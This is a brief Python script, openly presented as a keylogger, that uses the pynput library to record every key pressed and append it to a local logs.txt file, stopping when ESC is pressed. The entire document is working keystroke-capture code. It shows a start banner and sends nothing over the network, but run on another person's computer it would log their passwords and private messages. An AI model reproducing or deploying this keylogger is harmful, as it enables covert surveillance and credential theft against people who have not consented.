from pynput import keyboard
from datetime import datetime

log_file = "logs.txt"

def write_log(key):
    key = str(key).replace("'", "")

    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif "Key" in key:
        key = f"[{key}]"

    with open(log_file, "a") as f:
        f.write(key)

def on_press(key):
    write_log(key)

print("Keylogger started... Press ESC to stop.")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()